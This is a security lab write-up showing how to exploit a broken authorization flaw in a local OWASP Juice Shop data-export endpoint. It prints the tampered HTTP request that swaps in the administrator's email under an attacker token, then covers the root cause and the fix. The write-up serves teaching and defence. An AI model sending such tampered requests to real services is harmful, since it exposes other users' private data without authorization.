# Lab Writeup 4: Unauthorized Sensitive Data Exfiltration via BFLA

**Category:** Broken Function Level Authorization (BFLA)  
**Difficulty:** Practitioner  
**Date Completed:** 29/03/2026  
**Platform:** OWASP Juice Shop  
**Lab URL:** http://localhost:3000

---

## 1. Objective

Exploit a broken authorization misconfiguration within the data-export endpoint to trigger the packaging and external transfer of the Administrator's sensitive account data using an unauthorized user's token.

---

## 2. Vulnerability Overview

**Vulnerability Name:** Broken Function Level Authorization (BFLA) / Insecure Direct Object Reference (IDOR)

**CWE Reference:** CWE-639: Authorization Bypass Through User-Controlled Key

**What is this vulnerability?**

The application provides a GDPR-compliant `/rest/user/data-export` feature for users to request copies of their private data. However, the endpoint receives the target user email through the client's request body (`{"email": "..."}`) and blindly trusts it, failing to check if the provided email matches the authenticated user token making the request. 

---

## 3. Reconnaissance & Discovery

**Initial Exploration:**
- Logged in as a standard attacker account and initiated a legitimate data export request through the Privacy dashboard.
- Intercepted the outgoing request to understand the payload format.

**The "Aha!" Moment:**
I noticed that the API request includes a JSON body with an explicit `"email"` variable pointing to my own account. I immediately knew that if the server logic relies on this parameter instead of the JWT context to compile the data, I could manipulate it to target another user. 

**Tool(s) Used:** Burp Suite Community Edition

---

## 4. Exploitation Steps

### Step 1: Capture the Feature Workflow

Intercepted the legitimate export POST request sent from my attacker account in Burp Suite Proxy.

### Step 2: Modify the Target Email 

Sent the request to Repeater and modified the `"email"` string in the JSON payload to target the administrator (`admin@juice-sh.op`) instead of my own email, while keeping my own attacker JWT token in the Authorization header.

**Modified Request:**
```http
POST /rest/user/data-export HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: Bearer [ATTACKER_JWT_TOKEN]
Connection: close

{
  "email": "admin@juice-sh.op"
}
```

### Step 3: Forward the Request and Analyze

Forwarded the modified request through Burp Suite.

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 68
Connection: close

{
  "status": "success",
  "message": "Data export successfully completed",
  "url": "/ftp/admin_data_export.zip"
}
```

**Success!** The server accepted my request, packaged the requested user's sensitive information, and even provided me the FTP link to download the zipped data archive.

---

## 5. Root Cause Analysis

The application fails because it derives the system context from client-supplied variables rather than the verified, tamper-proof state maintained on the backend. 

**What the API Does:**
1. ✅ Checks that a token exists. 
2. ❌ **FAILS** to correlate the parameter within the request body against the authenticated user.
3. Blindly trusts that the requested parameter is valid.

**What the API Should Do:**
The server must discard the email parameter supplied by the client completely. It should independently look up the user's email using the safe user ID extracted within the verified JWT token:
```javascript
// Pseudocode - The Fix
const verifiedUserId = req.user.id; 

const user = await User.findByPk(verifiedUserId);
const targetEmailToExport = user.email; // Extracted securely on backend

exportDataWorkflow(targetEmailToExport);
```

---

## 6. Impact

- [x] Unauthorized Data Exfiltration
- [x] Identity Theft
- [x] Regulatory/Compliance Violation (GDPR)

**Severity:** High

**Justification:** Utilizing this mechanism, attackers can effortlessly siphon private data out of the system. In real-world platforms, this data typically includes social security numbers, banking details, behavioral analytics, and history, posing an immense privacy impact.

---

## 7. Remediation

1. **Context Derivation:** Never extract critical targeting references (`email`, `user_id`, `account_num`) from the client payload when performing actions tied to sessions. Always derive the user target from the decoded, signed JSON Web Token properties.
2. **Access Control Matrices:** If administrative proxies are allowed to export data for *other* users, implement robust RBAC to ensure the requester explicitly holds an "Admin" or "Support" role before accepting user-supplied parameters. 

---

## 8. Key Takeaways / What I Learned

- **Client-Side Parameters Cannot Be Trusted:** This BFLA was entirely reliant on the development flaw of trusting that the client's HTTP body request was sent in good faith.
- **Privacy Features are Double-Edged Swords:** Endpoints designed specifically for GDPR/privacy compliance (like exporting data) often become prime targets for attackers if authorization structures are poorly engineered.
